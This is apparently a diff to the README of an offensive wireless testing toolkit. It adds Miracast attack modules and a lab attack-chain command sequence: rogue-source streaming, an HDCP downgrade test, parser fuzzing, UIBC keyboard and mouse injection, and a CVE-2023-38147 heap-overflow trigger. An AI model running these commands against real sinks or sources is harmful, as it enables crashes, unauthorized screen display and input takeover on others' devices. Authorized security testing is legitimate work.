@@ -21,7 +21,13 @@ DIRECTAX supports the full Miracast attack chain:
 | `miracast-probe`    | post-join | TCP connect to a sink IP on port 7236, walks RTSP M1 (OPTIONS) and M3 (GET_PARAMETER wfd_video_formats, wfd_audio_codecs, wfd_client_rtp_ports, wfd_uibc_capability, wfd_content_protection, wfd_3d_video_formats, wfd_display_edid, wfd_coupled_sink, wfd_I2C, wfd_connector_type, wfd_standby_resume_capability). Parses the response. |
 | `miracast-sink`     | passive attack | Trivial RTSP responder that echoes CSeq correctly and answers OPTIONS so a Miracast source will progress past M2 and start sending M3/M4 parameters to the attacker. Useful for observing source behavior. |
 | `miracast-fuzz`     | active attack | Mutation fuzzer against a sink at :7236. Shapes: baseline, overlong CSeq, negative Content-Length, huge Content-Length, wfd_video_formats field mutations, negative RTP ports, bare-LF header injection, null method, random fuzz tail. Deterministic given a seed. |
+| `miracast-session`  | active | Drives the full RTSP M1-M7 lifecycle on a sink (OPTIONS, GET_PARAMETER, SET_PARAMETER, trigger SETUP, SETUP, PLAY, TEARDOWN). `--stop-at m3/m4/m6/play` controls how far. Reports reached state, negotiated session id and server RTP port, and the full wfd_* parameter set. |
+| `miracast-rogue-source` | active | Acts as an unauthenticated Miracast source against a sink. If the sink reaches PLAY it would display attacker-supplied media. Optional `--stream --ts-file <lab.ts>` sends a lab MPEG-TS over RTP. Stops at session-accept observable; no persistence. |
+| `miracast-hdcp`     | active | Reads the sink's advertised HDCP 2.x capability from M3, then runs a content-protection downgrade test: attempts PLAY with `wfd_content_protection: none`. If the sink still streams, media is exposed in clear. No HDCP key break, no media decryption. |
+| `miracast-wfd-fuzz` | active | Protocol-aware fuzzer for individual wfd_* parameters (wfd_video_formats token counts and non-hex, wfd_client_rtp_ports out-of-range, wfd_display_edid oversize/corrupt/block-count-lie, wfd_uibc_capability overlong). EDID forgery included. Liveness-gated crash detection. |
+| `miracast-join`     | setup | Auto-joins a sink P2P group via wpa_cli (p2p_find, p2p_connect pbc join), waits for the group interface, resolves the local IP and the sink gateway IP. Needs a second adapter with P2P interface support running wpa_supplicant. |
 | `miracast-uibc`     | active attack | UIBC HID keyboard injection into a Miracast source. Requires an authorized target source listening on a UIBC TCP port learned from its M4 wfd_uibc_capability. |
+| `miracast-uibc-click` | active attack | UIBC mouse click or touch tap injection at a given x/y on the source display. `--touch` sends a touch event instead of a mouse click. |
 | `cve-2023-38147`    | targeted CVE | Windows Miracast Wireless Display RTSP heap overflow. Sends a SET_PARAMETER with a wfd_video_formats value carrying ~500 whitespace-separated integer tokens, overflowing a fixed parser buffer in the WirelessDisplay service. Observable: sink stops answering RTSP OPTIONS. |
 
 ## Attack chain example (lab target)
@@ -33,26 +39,30 @@ Display Adapter, Windows PC with "Projecting to this PC" enabled).
 # 1. Find the sink and its RTSP port
 sudo python3 scan.py miracast-scan --duration 60 --all-bands --active --authorized
 
-# 2. Join its P2P group as a client (use wpa_cli outside DIRECTAX)
-sudo wpa_cli -i wlan0 p2p_connect <sink-p2p-mac> pbc join
+# 2. Auto-join its P2P group (needs a second adapter + wpa_supplicant)
+sudo python3 scan.py miracast-join -i wlan1 --sink-mac <sink-p2p-mac> --authorized
+#    -> prints group_interface, local_ip, sink_ip
 
-# 3. From inside the group, note the sink's IP address
-ip addr show p2p-wlan0-0
+# 3. Drive the full RTSP session and dump what the sink supports
+sudo python3 scan.py miracast-session --sink <sink-ip> --stop-at play --authorized
 
-# 4. RTSP probe the sink to enumerate what it supports
-sudo python3 scan.py miracast-probe --sink <sink-ip> --port 7236 --authorized
+# 4. Test whether the sink enforces HDCP or streams in clear
+sudo python3 scan.py miracast-hdcp --sink <sink-ip> --authorized
 
-# 5. If the sink is a Windows machine, test CVE-2023-38147
-sudo python3 scan.py cve-2023-38147 --sink <sink-ip> --port 7236 --authorized
+# 5. Act as a rogue source (would display our content on the sink)
+sudo python3 scan.py miracast-rogue-source --sink <sink-ip> --authorized
 
-# 6. Fuzz the sink's RTSP parser
-python3 scan.py miracast-fuzz --sink <sink-ip> --cases 256 --seed 1 --authorized
+# 6. Protocol-aware fuzz of the sink parser (wfd_* params + EDID)
+sudo python3 scan.py miracast-wfd-fuzz --sink <sink-ip> --seed 1 --authorized
 
-# 7. If the sink later becomes a source, inject HID via UIBC
-sudo python3 scan.py miracast-uibc --source <source-ip> \
-                                    --uibc-port 7239 \
-                                    --text 'notepad.exe\nhello' \
-                                    --authorized
+# 7. If the sink is a Windows machine, test CVE-2023-38147
+sudo python3 scan.py cve-2023-38147 --sink <sink-ip> --authorized
+
+# 8. If the sink later becomes a source, take over input via UIBC
+sudo python3 scan.py miracast-uibc --source <source-ip> --uibc-port 7239 \
+                                    --text 'hello' --authorized
+sudo python3 scan.py miracast-uibc-click --source <source-ip> --uibc-port 7239 \
+                                          --x 500 --y 300 --authorized
 ```
 
 ## Protocol references
